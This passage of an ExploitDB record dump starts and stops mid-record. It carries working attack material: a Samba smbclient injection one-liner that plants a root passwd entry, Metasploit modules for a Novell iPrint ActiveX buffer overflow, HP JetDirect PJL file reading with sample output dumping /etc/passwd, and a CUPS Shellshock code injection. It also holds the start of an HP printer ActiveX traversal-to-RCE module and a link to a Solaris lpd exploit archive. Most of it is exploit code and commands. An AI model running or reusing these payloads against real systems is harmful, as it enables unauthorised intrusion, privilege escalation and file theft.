u'author': u'wirepair', u'cve': [], u'source': u'ExploitDB', u'date': u'2004-03-24T00:00:00+00:00', u'_id': 23878, u'type': u'remote', u'port': 0}

CVE: []
Description: Samba 2.0.x/2.2 - Arbitrary File Creation
{u'code': u'source: http://www.securityfocus.com/bid/2928/info\r\n\r\nSamba is a freely available file and printer sharing application maintained and developed by the Samba Development Team. Samba allows file and printer sharing between operating systems on the Unix and Microsoft platforms.\r\n\r\nA remote local user can write arbitrary files on the Samba server, as the smb daemon does not sufficiently check NetBIOS name input. It is possible to overwrite files on the Samba server, and if a user has local access, potentially gain elevated privileges.\r\n\r\nThis problem makes it possible for a remote user to deny service to legitimate users, and a local user to potentially gain elevated privileges. \r\n\r\nsmbclient //NIMUE/"`perl -e \'{print "\\ntoor::0:0::/:/bin/sh\\n"}\'`" -n ../../../tmp/x -N\r\n\r\nFrom zhhsun <zhhsun@xanet.edu.cn>\r\n\r\nsmbclient //NIMUE/"`perl -e \'{print "\\nopendoor::511:511::/:/bin/sh\\n"}\'`" -n ../../../tmp/x -N -I 192.168.12.13\r\n\r\nand also\r\n\r\nsmbclient //NIMUE/"`perl -e \'{print "\\ntoor::0:0::/:/bin/sh\\n"}\'`" -n ../../../tmp/x -N -I 192.168.12.13\r\n\r\nYugo Yugos <yuggoboy@hotmail.com> provided an exploit script. It is available at http://www.securityfocus.com/data/vulnerabilities/exploits/samba-exp.sh', u'description': u'Samba 2.0.x/2.2 - Arbitrary File Creation', u'platform': u'unix', u'author': u'Michal Zalewski', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-06-23T00:00:00+00:00', u'_id': 20968, u'type': u'remote', u'port': 0}

CVE: []
Description: Novell iPrint Client - ActiveX Control target-frame Buffer Overflow (Metasploit)
{u'code': u'##\r\n# $Id: novelliprint_target_frame.rb 9262 2010-05-09 17:45:00Z jduck $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GreatRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpServer::HTML\r\n\tinclude Msf::Exploit::Remote::Seh\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'           => \'Novell iPrint Client ActiveX Control target-frame Buffer Overflow\',\r\n\t\t\t\'Description\'    => %q{\r\n\t\t\t\tThis module exploits a stack buffer overflow in Novell iPrint Client 5.30. When\r\n\t\t\t\tpassing an overly long string via the "target-frame" parameter to ienipp.ocx\r\n\t\t\t\tan attacker can execute arbitrary code.\r\n\r\n\t\t\t\tNOTE: The "operation" variable must be set to a valid command in order to reach this\r\n\t\t\t\tvulnerability.\r\n\t\t\t},\r\n\t\t\t\'License\'        => MSF_LICENSE,\r\n\t\t\t\'Author\'         => [ \'jduck\' ],\r\n\t\t\t\'Version\'        => \'$Revision: 9262 $\',\r\n\t\t\t\'References\'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'CVE\', \'2009-1568\' ],\r\n\t\t\t\t\t[ \'BID\', \'37242\' ],\r\n\t\t\t\t\t[ \'OSVDB\', \'60803\' ],\r\n\t\t\t\t\t[ \'URL\', \'http://secunia.com/advisories/37169/\' ]\r\n\t\t\t\t],\r\n\t\t\t\'DefaultOptions\' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'EXITFUNC\' => \'process\',\r\n\t\t\t\t},\r\n\t\t\t\'Payload\'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'Space\'         => 1456,\r\n\t\t\t\t\t\'BadChars\'      => "\\x00",\r\n\t\t\t\t},\r\n\t\t\t\'Platform\'       => \'win\',\r\n\t\t\t\'Targets\'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'iPrint 5.30 Windows Client\', { \'Ret\' => 0x100489ac } ] # p/p/r in ienipp.ocx v5.30\r\n\t\t\t\t],\r\n\t\t\t\'DisclosureDate\' => \'Dec 08 2009\',\r\n\t\t\t\'DefaultTarget\'  => 0))\r\n\tend\r\n\r\n\tdef autofilter\r\n\t\tfalse\r\n\tend\r\n\r\n\tdef check_dependencies\r\n\t\tuse_zlib\r\n\tend\r\n\r\n\tdef on_request_uri(cli, request)\r\n\t\t# Re-generate the payload.\r\n\t\treturn if ((p = regenerate_payload(cli)) == nil)\r\n\r\n\t\tsploit = p.encoded\r\n\r\n\t\t# the following must be an invalid pointer (unreadable)\r\n\t\tsploit << [rand(0xffffffff) | 0xc0000000].pack(\'V\')\r\n\r\n\t\tsploit << generate_seh_record(target.ret)\r\n\r\n\t\tdistance = 8 + 4 + payload_space\r\n\t\tsploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string\r\n\r\n\t\tsploit << rand_text_alphanumeric(2048 - sploit.length)\r\n\r\n\t\toperations = [\r\n\t\t\t"op-client-interface-version",\r\n\t\t\t"op-client-version-info",\r\n\t\t\t"op-client-is-printer-installed",\r\n\t\t\t"op-user-get-role",\r\n\t\t\t"op-printer-install",\r\n\t\t\t"op-printer-remove",\r\n\t\t\t"op-printer-get-status",\r\n\t\t\t"op-printer-get-info",\r\n\t\t\t"op-printer-pause",\r\n\t\t\t"op-printer-resume",\r\n\t\t\t"op-printer-purge-jobs",\r\n\t\t\t"op-printer-list-users-jobs",\r\n\t\t\t"op-printer-list-all-jobs",\r\n\t\t\t"op-printer-send-test-page",\r\n\t\t\t"op-printer-send-file",\r\n\t\t\t"op-printer-setup-install",\r\n\t\t\t"op-job-get-info",\r\n\t\t\t"op-job-hold",\r\n\t\t\t"op-job-release-hold",\r\n\t\t\t"op-job-cancel",\r\n\t\t\t"op-job-restart",\r\n\t\t\t"op-dbg-printer-get-all-attrs",\r\n\t\t\t"op-dbg-job-get-all-attrs"\r\n\t\t]\r\n\t\toperation = operations[rand(operations.length)]\r\n\r\n\t\t# escape single quotes\r\n\t\tsploit = xml_encode(sploit)\r\n\r\n\t\tcontent = %Q|<html>\r\n<object classid=\'clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C\'>\r\n<param name=\'operation\' value=\'#{operation}\' />\r\n<param name=\'target-frame\' value=\'#{sploit}\' />\r\n</object>\r\n</html>\r\n|\r\n\r\n\t\tcontent = Rex::Text.randomize_space(content)\r\n\r\n\t\tprint_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")\r\n\r\n\t\t# Transmit the response to the client\r\n\t\tsend_response_html(cli, content)\r\n\r\n\t\t# Handle the payload\r\n\t\thandler(cli)\r\n\tend\r\n\r\n\tdef xml_encode(str)\r\n\t\tret = ""\r\n\t\tstr.unpack(\'C*\').each { |ch|\r\n\t\t\tcase ch\r\n\t\t\twhen 0x41..0x5a, 0x61..0x7a, 0x30..0x39\r\n\t\t\t\tret << ch.chr\r\n\t\t\telse\r\n\t\t\t\tret << "&#x"\r\n\t\t\t\tret << ch.chr.unpack(\'H*\')[0]\r\n\t\t\t\tret << ";"\r\n\t\t\tend\r\n\t\t}\r\n\t\tret\r\n\tend\r\n\r\nend', u'description': u'Novell iPrint Client - ActiveX Control target-frame Buffer Overflow (Metasploit)', u'platform': u'windows', u'author': u'Metasploit', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-05-09T00:00:00+00:00', u'_id': 16523, u'type': u'remote', u'port': 0}

CVE: []
Description: Solaris 2.x/7.0/8 LPD - Remote Command Execution
{u'code': u"source: http://www.securityfocus.com/bid/3274/info\r\n\r\nThe print protocol daemon, 'in.lpd' (or 'lpd'), shipped with Solaris may allow for remote attackers to execute arbitrary commands on target hosts with superuser privileges.\r\n\r\nThe alleged vulnerability is not the buffer overflow discovered by ISS.\r\n\r\nIt has been reported that it is possible to execute commands on target hosts through lpd by manipulating the use of sendmail by the daemon.\r\n\r\nIf this vulnerability is successfully exploited, remote attackers can execute any command on the target host with superuser privileges.\r\n\r\nThis vulnerability is very similar to one mentioned in NAI advisory NAI-0020.\r\n\r\nNOTE: It has been reported that a valid printer does NOT need to be configured to exploit this vulnerability.\r\n\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/21097.tar.gz", u'description': u'Solaris 2.x/7.0/8 LPD - Remote Command Execution', u'platform': u'solaris', u'author': u'ron1n', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-08-31T00:00:00+00:00', u'_id': 21097, u'type': u'remote', u'port': 0}

CVE: []
Description: HP JetDirect PJL - Query Execution (Metasploit)
{u'code': u'# Exploit Title: HP JetDirect PJL Query Execution\r\n# Date: Aug 7, 2011\r\n# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>\r\n# Software Link: http://www.hp.com\r\n# Version: All\r\n# Tested on: HP LaserJet Pxxxx Series\r\n\r\n##\r\n# $Id: $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\n\r\n##\r\n# Sample Output:\r\n# \r\n#\r\n# msf auxiliary(hp_printer_pjl_cmd) > show options\r\n# \r\n# Module options (auxiliary/admin/hp_printer_pjl_cmd):\r\n# \r\n#    Name         Current Setting                                           Required  Description\r\n#    ----         ---------------                                           --------  -----------\r\n#    CMD          FSUPLOAD NAME="0:/../../../etc/passwd" OFFSET=0 SIZE=999  yes       PJL Command to run\r\n#    INTERACTIVE  true                                                      no        Enter interactive mode [msfconsole Only]\r\n#    RHOST        202.138.16.21                                             yes       The target address\r\n#    RPORT        9100                                                      yes       The target port\r\n# \r\n# msf auxiliary(hp_printer_pjl_cmd) > run\r\n# \r\n# [*] Entering interactive mode ...\r\n# [*] Please wait while executing -\r\n# [*] FSUPLOAD NAME="0:/../../../etc/passwd" OFFSET=0 SIZE=999\r\n# [+] Server returned the following response:\r\n# \r\n# root::0:0::/:/bin/dlsh\r\n# \r\n# \r\n# [*] Enter PJL Command:\r\n# [*] -> \'quit\' to exit\r\n# $ > fsdirlist name="0:/../../../" entry=1 count=99999999\r\n# [*] Please wait while executing -\r\n# [*] fsdirlist name="0:/../../../" entry=1 count=99999999\r\n# [+] Server returned the following response:\r\n# \r\n# . TYPE=DIR\r\n# .. TYPE=DIR\r\n# bin TYPE=DIR\r\n# usr TYPE=DIR\r\n# etc TYPE=DIR\r\n# hpmnt TYPE=DIR\r\n# hp TYPE=DIR\r\n# lib TYPE=DIR\r\n# dev TYPE=DIR\r\n# init TYPE=FILE SIZE=9016\r\n# .profile TYPE=FILE SIZE=834\r\n# tmp TYPE=DIR\r\n# \r\n# \r\n# [*] Enter PJL Command:\r\n# [*] -> \'quit\' to exit\r\n# $ > quit\r\n# [*] Exited ... Have fun with your Printer!\r\n# [*] Auxiliary module execution completed\r\n# msf auxiliary(hp_printer_pjl_cmd) > \r\n\r\n\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Auxiliary\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'        => \'HP JetDirect Printer PJL Query Execution\',\r\n\t\t\t\'Version\'     => \'$Revision: 1 $\',\r\n\t\t\t\'Description\'\t=> %q{\r\n\t\t\t\tThis module act as a HP printer PJL (Printer Job Language) query tool that allows you to submit your own PJL commands. Valid PJL commands are required to get successful response. See the reference section for PJL reference guides from HP. \r\n\t\t\t},\r\n\t\t\t\'Author\'      => [\r\n\t\t\t\t\t\'Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>\' \r\n\t\t\t\t\t],\r\n\t\t\t\'License\'     => MSF_LICENSE,\r\n\t\t\t\'References\'     =>\r\n\t\t\t[\r\n\t\t\t\t[ \'URL\', \'http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf\' ],\r\n\t\t\t\t[ \'URL\', \'http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13207/bpl13207.pdf\' ],\r\n\t\t\t\t[ \'URL\', \'https://secure.wikimedia.org/wikipedia/en/wiki/Printer_Job_Language\' ],\r\n\t\t\t\t[ \'URL\', \'http://core.yehg.net/lab/#tools.exploits\' ]\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t],\r\n\t\t\t\'DisclosureDate\' => \' 2011\'))\r\n\t\t\r\n\t\tregister_options(\r\n\t\t[\r\n\t\t\tOptString.new(\'CMD\',\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\ttrue,\r\n\t\t\t\t\t\t"PJL Command to run",\r\n\t\t\t\t\t\t\'FSUPLOAD NAME="0:/../../../.profile" OFFSET=0 SIZE=999\'\r\n\t\t\t\t\t]\r\n\t\t\t\t),\r\n\t\t\tOptBool.new(\'INTERACTIVE\',\r\n\t\t\t\t\t\t\t\t[\r\n\t\t\t\t\t\t\t\t\tfalse,\r\n\t\t\t\t\t\t\t\t\t"Enter interactive mode [msfconsole Only]",\r\n\t\t\t\t\t\t\t\t\tfalse\r\n\t\t\t\t\t\t\t\t]\r\n\t\t\t\t\t\t\t),\r\n\t\t\t\t\r\n\t\t\tOpt::RPORT(9100)\r\n\t\t],self.class)\r\n\t\t\r\n\r\n\tend\r\n\r\n\tdef run\r\n\t\tmode = datastore[\'INTERACTIVE\']\r\n\r\n\t\tif mode\t== true\r\n\t\t\tset_interactive(datastore[\'CMD\'])\r\n\t\telse\r\n\t\t\tset_onetime(datastore[\'CMD\'])\r\n\t\tend\r\n\tend\r\n\t\r\n\tdef set_interactive(scmd)\r\n\t\tcmd = scmd\r\n\t\r\n\t\tprint_status("Entering interactive mode ...")\r\n\t\tstop = false\r\n\t\t\r\n\t\tset_onetime(cmd)\r\n\t\t\r\n\t\tuntil stop == true\t\t\r\n\t\t\tprint_status("Enter PJL Command:")\r\n\t\t\tprint_status("-> \'quit\' to exit")\r\n\t\t\tprint("$ > ")\r\n\t\t\ttmp_cmd = \'\'\r\n\t\t\ttmp_cmd = gets.chomp.to_s\t\r\n\t\t\tif tmp_cmd =~ /quit/\r\n\t\t\t\tstop= true\r\n\t\t\t\tprint_status("Exited ... Have fun with your Printer!")\r\n\t\t\telse\r\n\t\t\t\tset_onetime(tmp_cmd)\t\r\n\t\t\tend\r\n\t\tend\r\n\tend \r\n\t\r\n\tdef set_onetime(scmd)\r\n\r\n\t\tconnect\r\n\t\t\r\n\t\tcmd = "\\x1b%-12345X@PJL [REPLACE]\\x0d\\x0a\\x1b%-12345X\\x0d\\x0a"\r\n\t\tr_cmd = cmd.sub("[REPLACE]",scmd)\r\n\t\t\r\n \t\tprint_status("Please wait while executing -")\r\n\t\tprint_status("#{scmd}")\r\n\t\t\r\n\t\trecv = sock.put(r_cmd)\r\n\t\tres = sock.get(-1,1)\r\n\t\t\r\n\t\tif (!res)\r\n\t\t\tprint_error("ERROR in receiving data!\\r\\n")\r\n\t\telse\r\n\t\t\tif res.to_s =~ /ERROR/ \r\n\t\t\t\tprint_error("BAD COMMAND OR ERROR\\r\\n")\r\n\t\t\t\tdisconnect\r\n\t\t\t\treturn\r\n\t\t\tend\r\n\t\t\tresx = res.to_s[res.index("\\r\\n")+1,res.length]\r\n\t\t\tprint_good("Server returned the following response:\\r\\n#{resx}")\r\n\t\tend\r\n\t\t\r\n\t\tdisconnect\t\r\n\t\r\n\tend\r\n\r\n\r\nend', u'description': u'HP JetDirect PJL - Query Execution (Metasploit)', u'platform': u'hardware', u'author': u'Myo Soe', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-08-07T00:00:00+00:00', u'_id': 17636, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2014-6278', u'CVE-2014-6271']
Description: CUPS Filter - Bash Environment Variable Code Injection (Metasploit)
{u'code': u'##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit4 < Msf::Exploit::Remote\r\n  Rank = GoodRanking\r\n  include Msf::Exploit::Remote::HttpClient\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n      \'Name\' => \'CUPS Filter Bash Environment Variable Code Injection\',\r\n      \'Description\' => %q{\r\n        This module exploits a post-auth code injection in specially crafted\r\n        environment variables in Bash, specifically targeting CUPS filters\r\n        through the PRINTER_INFO and PRINTER_LOCATION variables by default.\r\n      },\r\n      \'Author\' => [\r\n        \'Stephane Chazelas\', # Vulnerability discovery\r\n        \'lcamtuf\', # CVE-2014-6278\r\n        \'Brendan Coles <bcoles[at]gmail.com>\' # msf\r\n      ],\r\n      \'References\' => [\r\n        [\'CVE\', \'2014-6271\'],\r\n        [\'CVE\', \'2014-6278\'],\r\n        [\'EDB\', \'34765\'],\r\n        [\'URL\', \'https://access.redhat.com/articles/1200223\'],\r\n        [\'URL\', \'http://seclists.org/oss-sec/2014/q3/649\']\r\n      ],\r\n      \'Privileged\' => false,\r\n      \'Arch\' => ARCH_CMD,\r\n      \'Platform\' => \'unix\',\r\n      \'Payload\' =>\r\n        {\r\n          \'Space\' => 1024,\r\n          \'BadChars\' => "\\x00\\x0A\\x0D",\r\n          \'DisableNops\' => true\r\n        },\r\n      \'Compat\' =>\r\n        {\r\n          \'PayloadType\' => \'cmd\',\r\n          \'RequiredCmd\' => \'generic bash awk ruby\'\r\n        },\r\n      # Tested:\r\n      # - CUPS version 1.4.3 on Ubuntu 10.04 (x86)\r\n      # - CUPS version 1.5.3 on Debian 7 (x64)\r\n      # - CUPS version 1.6.2 on Fedora 19 (x64)\r\n      # - CUPS version 1.7.2 on Ubuntu 14.04 (x64)\r\n      \'Targets\' =>  [[ \'Automatic Targeting\', { \'auto\' => true } ]],\r\n      \'DefaultTarget\' => 0,\r\n      \'DisclosureDate\' => \'Sep 24 2014\',\r\n      \'License\' => MSF_LICENSE\r\n    ))\r\n    register_options([\r\n      Opt::RPORT(631),\r\n      OptBool.new(\'SSL\', [ true, \'Use SSL\', true ]),\r\n      OptString.new(\'USERNAME\', [ true, \'CUPS username\', \'root\']),\r\n      OptString.new(\'PASSWORD\', [ true, \'CUPS user password\', \'\']),\r\n      OptEnum.new(\'CVE\', [ true, \'CVE to exploit\', \'CVE-2014-6271\', [\'CVE-2014-6271\', \'CVE-2014-6278\'] ]),\r\n      OptString.new(\'RPATH\', [ true, \'Target PATH for binaries\', \'/bin\' ])\r\n    ], self.class)\r\n  end\r\n\r\n  #\r\n  # CVE-2014-6271\r\n  #\r\n  def cve_2014_6271(cmd)\r\n    %{() { :;}; $(#{cmd}) & }\r\n  end\r\n\r\n  #\r\n  # CVE-2014-6278\r\n  #\r\n  def cve_2014_6278(cmd)\r\n    %{() { _; } >_[$($())] { echo -e "\\r\\n$(#{cmd})\\r\\n" ; }}\r\n  end\r\n\r\n  #\r\n  # Check credentials\r\n  #\r\n  def check\r\n    @cookie = rand_text_alphanumeric(16)\r\n    printer_name = rand_text_alphanumeric(10 + rand(5))\r\n    res = add_printer(printer_name, \'\')\r\n    if !res\r\n      vprint_error("#{peer} - No response from host")\r\n      return Exploit::CheckCode::Unknown\r\n    elsif res.headers[\'Server\'] =~ /CUPS\\/([\\d\\.]+)/\r\n      vprint_status("#{peer} - Found CUPS version #{$1}")\r\n    else\r\n      print_status("#{peer} - Target is not a CUPS web server")\r\n      return Exploit::CheckCode::Safe\r\n    end\r\n    if res.body =~ /Set Default Options for #{printer_name}/\r\n      vprint_good("#{peer} - Added printer successfully")\r\n      delete_printer(printer_name)\r\n    elsif res.code == 401 || (res.code == 426 && datastore[\'SSL\'] == true)\r\n      vprint_error("#{peer} - Authentication failed")\r\n    elsif res.code == 426\r\n      vprint_error("#{peer} - SSL required - set SSL true")\r\n    end\r\n    Exploit::CheckCode::Detected\r\n  end\r\n\r\n  #\r\n  # Exploit\r\n  #\r\n  def exploit\r\n    @cookie = rand_text_alphanumeric(16)\r\n    printer_name = rand_text_alphanumeric(10 + rand(5))\r\n\r\n    # Select target CVE\r\n    case datastore[\'CVE\']\r\n    when \'CVE-2014-6278\'\r\n      cmd = cve_2014_6278(payload.raw)\r\n    else\r\n      cmd = cve_2014_6271(payload.raw)\r\n    end\r\n\r\n    # Add a printer containing the payload\r\n    # with a CUPS filter pointing to /bin/bash\r\n    res = add_printer(printer_name, cmd)\r\n    if !res\r\n      fail_with(Failure::Unreachable, "#{peer} - Could not add printer - Connection failed.")\r\n    elsif res.body =~ /Set Default Options for #{printer_name}/\r\n      print_good("#{peer} - Added printer successfully")\r\n    elsif res.code == 401 || (res.code == 426 && datastore[\'SSL\'] == true)\r\n      fail_with(Failure::NoAccess, "#{peer} - Could not add printer - Authentication failed.")\r\n    elsif res.code == 426\r\n      fail_with(Failure::BadConfig, "#{peer} - Could not add printer - SSL required - set SSL true.")\r\n    else\r\n      fail_with(Failure::Unknown, "#{peer} - Could not add printer.")\r\n    end\r\n\r\n    # Add a test page to the print queue.\r\n    # The print job triggers execution of the bash filter\r\n    # which executes the payload in the environment variables.\r\n    res = print_test_page(printer_name)\r\n    if !res\r\n      fail_with(Failure::Unreachable, "#{peer} - Could not add test page to print queue - Connection failed.")\r\n    elsif res.body =~ /Test page sent; job ID is/\r\n      vprint_good("#{peer} - Added test page to printer queue")\r\n    elsif res.code == 401 || (res.code == 426 && datastore[\'SSL\'] == true)\r\n      fail_with(Failure::NoAccess, "#{peer} - Could not add test page to print queue - Authentication failed.")\r\n    elsif res.code == 426\r\n      fail_with(Failure::BadConfig, "#{peer} - Could not add test page to print queue - SSL required - set SSL true.")\r\n    else\r\n      fail_with(Failure::Unknown, "#{peer} - Could not add test page to print queue.")\r\n    end\r\n\r\n    # Delete the printer\r\n    res = delete_printer(printer_name)\r\n    if !res\r\n      fail_with(Failure::Unreachable, "#{peer} - Could not delete printer - Connection failed.")\r\n    elsif res.body =~ /has been deleted successfully/\r\n      print_status("#{peer} - Deleted printer \'#{printer_name}\' successfully")\r\n    elsif res.code == 401 || (res.code == 426 && datastore[\'SSL\'] == true)\r\n      vprint_warning("#{peer} - Could not delete printer \'#{printer_name}\' - Authentication failed.")\r\n    elsif res.code == 426\r\n      vprint_warning("#{peer} - Could not delete printer \'#{printer_name}\' - SSL required - set SSL true.")\r\n    else\r\n      vprint_warning("#{peer} - Could not delete printer \'#{printer_name}\'")\r\n    end\r\n  end\r\n\r\n  #\r\n  # Add a printer to CUPS\r\n  #\r\n  def add_printer(printer_name, cmd)\r\n    vprint_status("#{peer} - Adding new printer \'#{printer_name}\'")\r\n\r\n    ppd_name = "#{rand_text_alphanumeric(10 + rand(5))}.ppd"\r\n    ppd_file = <<-EOF\r\n*PPD-Adobe: "4.3"\r\n*%==== General Information Keywords ========================\r\n*FormatVersion: "4.3"\r\n*FileVersion: "1.00"\r\n*LanguageVersion: English\r\n*LanguageEncoding: ISOLatin1\r\n*PCFileName: "#{ppd_name}"\r\n*Manufacturer: "Brother"\r\n*Product: "(Brother MFC-3820CN)"\r\n*1284DeviceID: "MFG:Brother;MDL:MFC-3820CN"\r\n*cupsVersion: 1.1\r\n*cupsManualCopies: False\r\n*cupsFilter: "application/vnd.cups-postscript 0 #{datastore[\'RPATH\']}/bash"\r\n*cupsModelNumber: #{rand(10) + 1}\r\n*ModelName: "Brother MFC-3820CN"\r\n*ShortNickName: "Brother MFC-3820CN"\r\n*NickName: "Brother MFC-3820CN CUPS v1.1"\r\n*%\r\n*%==== Basic Device Capabilities =============\r\n*LanguageLevel: "3"\r\n*ColorDevice: True\r\n*DefaultColorSpace: RGB\r\n*FileSystem: False\r\n*Throughput: "12"\r\n*LandscapeOrientation: Plus90\r\n*VariablePaperSize: False\r\n*TTRasterizer: Type42\r\n*FreeVM: "1700000"\r\n\r\n*DefaultOutputOrder: Reverse\r\n*%==== Media Selection ======================\r\n\r\n*OpenUI *PageSize/Media Size: PickOne\r\n*OrderDependency: 18 AnySetup *PageSize\r\n*DefaultPageSize: BrLetter\r\n*PageSize BrA4/A4:        "<</PageSize[595 842]/ImagingBBox null>>setpagedevice"\r\n*PageSize BrLetter/Letter:      "<</PageSize[612 792]/ImagingBBox null>>setpagedevice"\r\nEOF\r\n\r\n    pd = Rex::MIME::Message.new\r\n    pd.add_part(ppd_file, \'application/octet-stream\', nil, %(form-data; name="PPD_FILE"; filename="#{ppd_name}"))\r\n    pd.add_part("#{@cookie}", nil, nil, %(form-data; name="org.cups.sid"))\r\n    pd.add_part("add-printer", nil, nil, %(form-data; name="OP"))\r\n    pd.add_part("#{printer_name}", nil, nil, %(form-data; name="PRINTER_NAME"))\r\n    pd.add_part("", nil, nil, %(form-data; name="PRINTER_INFO")) # injectable\r\n    pd.add_part("#{cmd}", nil, nil, %(form-data; name="PRINTER_LOCATION")) # injectable\r\n    pd.add_part("file:///dev/null", nil, nil, %(form-data; name="DEVICE_URI"))\r\n\r\n    data = pd.to_s\r\n    data.strip!\r\n\r\n    send_request_cgi(\r\n      \'method\' => \'POST\',\r\n      \'uri\' => normalize_uri(target_uri.path, \'admin\'),\r\n      \'ctype\' => "multipart/form-data; boundary=#{pd.bound}",\r\n      \'data\' => data,\r\n      \'cookie\' => "org.cups.sid=#{@cookie};",\r\n      \'authorization\' => basic_auth(datastore[\'USERNAME\'], datastore[\'PASSWORD\'])\r\n    )\r\n  end\r\n\r\n  #\r\n  # Queue a printer test page\r\n  #\r\n  def print_test_page(printer_name)\r\n    vprint_status("#{peer} - Adding test page to printer queue")\r\n    send_request_cgi(\r\n      \'method\' => \'POST\',\r\n      \'uri\' => normalize_uri(target_uri.path, \'printers\', printer_name),\r\n      \'authorization\' => basic_auth(datastore[\'USERNAME\'], datastore[\'PASSWORD\']),\r\n      \'cookie\' => "org.cups.sid=#{@cookie}",\r\n      \'vars_post\' => {\r\n        \'org.cups.sid\' => @cookie,\r\n        \'OP\' => \'print-test-page\'\r\n      }\r\n    )\r\n  end\r\n\r\n  #\r\n  # Delete a printer\r\n  #\r\n  def delete_printer(printer_name)\r\n    vprint_status("#{peer} - Deleting printer \'#{printer_name}\'")\r\n    send_request_cgi(\r\n      \'method\' => \'POST\',\r\n      \'uri\' => normalize_uri(target_uri.path, \'admin\'),\r\n      \'authorization\' => basic_auth(datastore[\'USERNAME\'], datastore[\'PASSWORD\']),\r\n      \'cookie\' => "org.cups.sid=#{@cookie}",\r\n      \'vars_post\' => {\r\n        \'org.cups.sid\' => @cookie,\r\n        \'OP\' => \'delete-printer\',\r\n        \'printer_name\' => printer_name,\r\n        \'confirm\' => \'Delete Printer\'\r\n      }\r\n    )\r\n  end\r\n\r\nend', u'description': u'CUPS Filter - Bash Environment Variable Code Injection (Metasploit)', u'platform': u'linux', u'author': u'Metasploit', u'cve': [u'CVE-2014-6278', u'CVE-2014-6271'], u'source': u'ExploitDB', u'date': u'2014-10-29T00:00:00+00:00', u'_id': 35115, u'type': u'remote', u'port': 631}

CVE: []
Description: HP Easy Printer Care - XMLSimpleAccessor Class ActiveX Control Remote Code Execution (Metasploit)
{u'code': u'##\r\n# $Id: hp_easy_printer_care_xmlsimpleaccessor.rb 13593 2011-08-20 00:11:22Z sinn3r $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GreatRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpServer::HTML\r\n\tinclude Msf::Exploit::EXE\r\n\tinclude Msf::Exploit::WbemExec\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'           => \'HP Easy Printer Care XMLSimpleAccessor Class ActiveX Control Remote Code Execution\',\r\n\t\t\t\'Description\'    => %q{\r\n\t\t\t\t\tThis module allows remote attackers to place arbitrary files on a users file system\r\n\t\t\t\tby abusing via Directory Traversal attack the "saveXML" method from the "XMLSimpleAccessor"\r\n\t\t\t\tclass in the HP Easy Printer HPTicketMgr.dll ActiveX Control (HPTicketMgr.dll 2.7.2.0).\r\n\r\n\t\t\t\tCode execution can be achieved by first uploading the payload to the remote machine embedded\r\n\t\t\t\tin a vbs file, and then upload another mof file, which enables Windows Management\r\n\t\t\t\tInstrumentation service to execute the vbs. Please note that this module currently only works\r\n\t\t\t\tfor Windows before Vista.\r\n\t\t\t},\r\n\t\t\t\'License\'        => MSF_LICENSE,\r\n\t\t\t\'Author\'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t\'Andrea Micalizzi\',  # aka rgod original discovery\r\n\t\t\t\t\t\'juan vazquez\',      # Original Metasploit module\r\n\t\t\t\t],\r\n\t\t\t\'Version\'        => \'$Revision: 13593 $\',\r\n\t\t\t\'References\'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'CVE\', \'2011-2404 \'],\r\n\t\t\t\t\t[ \'OSVDB\', \'74510\'],\r\n\t\t\t\t\t[ \'BID\', \'49100\'],\r\n\t\t\t\t\t[ \'URL\', \'http://www.zerodayinitiative.com/advisories/ZDI-11-261/\' ],\r\n\t\t\t\t],\r\n\t\t\t\'DefaultOptions\' =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'InitialAutoRunScript\' => \'migrate -f\',\r\n\t\t\t\t},\r\n\t\t\t\'Payload\'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'Space\'           => 2048,\r\n\t\t\t\t\t\'StackAdjustment\' => -3500,\r\n\t\t\t\t},\r\n\t\t\t\'Platform\'       => 